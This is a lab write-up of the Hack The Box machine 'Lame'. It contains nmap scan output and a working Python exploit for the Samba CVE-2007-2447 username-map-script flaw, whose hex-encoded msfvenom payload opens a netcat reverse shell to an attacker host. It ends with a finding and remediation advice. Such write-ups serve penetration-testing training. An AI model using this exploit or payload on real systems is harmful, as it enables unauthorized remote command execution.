Hostname: Lame
IP Address: 10.10.10.3
Operation System: Linux - Ubuntu 8.04
Domain: (http://hackthebox.gr)
Ports: 21,22,139,445,3632

AllPorts:
```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.3 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-07 20:18 EST
Initiating SYN Stealth Scan at 20:18
Scanning 10.10.10.3 [65535 ports]
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 22/tcp on 10.10.10.3
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 21/tcp on 10.10.10.3
Discovered open port 3632/tcp on 10.10.10.3
Completed SYN Stealth Scan at 20:19, 26.61s elapsed (65535 total ports)
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.18s latency).
Scanned at 2023-11-07 20:18:40 EST for 26s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.68 seconds
           Raw packets sent: 131083 (5.768MB) | Rcvd: 23 (1.012KB)
```

Nmap TCP:
```bash
nmap -Pn -sC -sV -vv -n -p 21,22,139,445,3632 10.10.10.3               
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-07 20:19 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:19
Completed NSE at 20:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:19
Completed NSE at 20:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:19
Completed NSE at 20:19, 0.00s elapsed
Initiating SYN Stealth Scan at 20:19
Scanning 10.10.10.3 [5 ports]
Discovered open port 21/tcp on 10.10.10.3
Discovered open port 22/tcp on 10.10.10.3
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 3632/tcp on 10.10.10.3
Discovered open port 139/tcp on 10.10.10.3
Completed SYN Stealth Scan at 20:19, 0.61s elapsed (5 total ports)
Initiating Service scan at 20:19
Scanning 5 services on 10.10.10.3
Completed Service scan at 20:20, 12.34s elapsed (5 services on 1 host)
NSE: Script scanning 10.10.10.3.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:20
NSE: [ftp-bounce 10.10.10.3:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.86% done; ETC: 20:20 (0:00:00 remaining)
Completed NSE at 20:20, 40.07s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:20
Completed NSE at 20:20, 2.82s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:20
Completed NSE at 20:20, 0.00s elapsed
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.32s latency).
Scanned at 2023-11-07 20:19:52 EST for 55s

PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 5656240f211ddea72bae61b1243de8f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-11-07T20:20:16-05:00
|_clock-skew: mean: 2h30m09s, deviation: 3h32m09s, median: 8s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 51023/tcp): CLEAN (Timeout)
|   Check 3 (port 64610/udp): CLEAN (Timeout)
|   Check 4 (port 40169/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:20
Completed NSE at 20:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:20
Completed NSE at 20:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:20
Completed NSE at 20:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.29 seconds
           Raw packets sent: 5 (220B) | Rcvd: 5 (220B)
```

NMAP UDP:
```bash
nmap -Pn -sUV --top-ports 100 -oA UDP -vv --open 10.10.10.3  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-07 20:21 EST
NSE: Loaded 45 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 20:21
Completed Parallel DNS resolution of 1 host. at 20:21, 2.03s elapsed
Initiating UDP Scan at 20:21
Scanning 10.10.10.3 [100 ports]
Completed UDP Scan at 20:21, 10.29s elapsed (100 total ports)
Initiating Service scan at 20:21
Scanning 98 services on 10.10.10.3
Service scan Timing: About 1.02% done; ETC: 23:02 (2:38:26 remaining)
Service scan Timing: About 21.43% done; ETC: 20:37 (0:11:55 remaining)
Service scan Timing: About 41.84% done; ETC: 20:33 (0:06:47 remaining)
Service scan Timing: About 62.24% done; ETC: 20:32 (0:03:57 remaining)
Service scan Timing: About 82.65% done; ETC: 20:31 (0:01:42 remaining)
Completed Service scan at 20:30, 492.93s elapsed (98 services on 1 host)
NSE: Script scanning 10.10.10.3.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 20:30
Completed NSE at 20:30, 8.86s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 20:30
Completed NSE at 20:30, 13.99s elapsed
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.31s latency).
Scanned at 2023-11-07 20:21:48 EST for 526s
All 100 scanned ports on 10.10.10.3 are in ignored states.
Not shown: 98 open|filtered udp ports (no-response), 2 closed udp ports (port-unreach)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 528.36 seconds
           Raw packets sent: 227 (13.390KB) | Rcvd: 3 (168B)
```


**Exploitation:**

msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.16.2 LPORT=9797 -f python
![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/1f00b84c-51c0-48ce-847d-746f19f3e6f7/39c65eaf-8a79-426a-b50f-989b449407aa/Untitled.png)

nc -nlvp 9797

python3 CVE-2007-2447.py 10.10.10.3

Exploit used: [CVE-2007-2447.py](http://cve-2007-2447.py/)

```python
#!/usr/bin/python3

from smb.SMBConnection import SMBConnection
import random, string
from smb import smb_structs
smb_structs.SUPPORT_SMB2 = False
import sys

# Just a python version of a very simple Samba exploit.
# It doesn't have to be pretty because the shellcode is executed
# in the username field.

# Based off this Metasploit module - https://www.exploit-db.com/exploits/16320/

# Configured SMB connection options with info from here:
# https://pythonhosted.org/pysmb/api/smb_SMBConnection.html

# Use the commandline argument as the target:
if len(sys.argv) < 2:
    print("\nUsage: " + sys.argv[0] + " <HOST>\n")
    sys.exit()

# Shellcode:
# msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.0.35 LPORT=9999 -f python

#buf = ""
#buf += "\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b"
#buf += "\x62\x67\x61\x66\x3b\x20\x6e\x63\x20\x31\x30\x2e\x30"
#buf += "\x2e\x30\x2e\x33\x35\x20\x39\x39\x39\x39\x20\x30\x3c"
#buf += "\x2f\x74\x6d\x70\x2f\x6b\x62\x67\x61\x66\x20\x7c\x20"
#buf += "\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74\x6d\x70"
#buf += "\x2f\x6b\x62\x67\x61\x66\x20"

buf =  b""
buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f"
buf += b"\x6b\x75\x67\x69\x6f\x6e\x3b\x20\x6e\x63\x20\x31"
buf += b"\x30\x2e\x31\x30\x2e\x31\x36\x2e\x32\x20\x39\x37"
buf += b"\x39\x37\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x6b\x75"
buf += b"\x67\x69\x6f\x6e\x20\x7c\x20\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x20\x3e\x2f\x74\x6d\x70\x2f\x6b\x75\x67"
buf += b"\x69\x6f\x6e\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d"
buf += b"\x20\x2f\x74\x6d\x70\x2f\x6b\x75\x67\x69\x6f\x6e"

username = "/=`nohup " + buf.decode() + "`"
password = ""
conn = SMBConnection(username, password, "SOMEBODYHACKINGYOU", "METASPLOITABLE", use_ntlm_v2=False)
assert conn.connect(sys.argv[1], 445)
```


Title: Finding IPT - 001: CVE-2007-2447 - Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution
Description: exploits a command execution vulerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands.
Risk:
CVE: CVE-2007-2447
Code: OSVDB-34700
System: 10.10.10.3
Tools Used: nmap, searchsploit
References:
           http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
           https://www.exploit-db.com/exploits/16320
           https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851          
           http://www.samba.org/samba/docs/server_security.html
Remediation: The Samba Team always encourages users to run the latest stable release as a defense against attacks.  If this is not immediately possible, administrators should read the "Server Security" documentation found at http://www.samba.org/samba/docs/server_security.html.

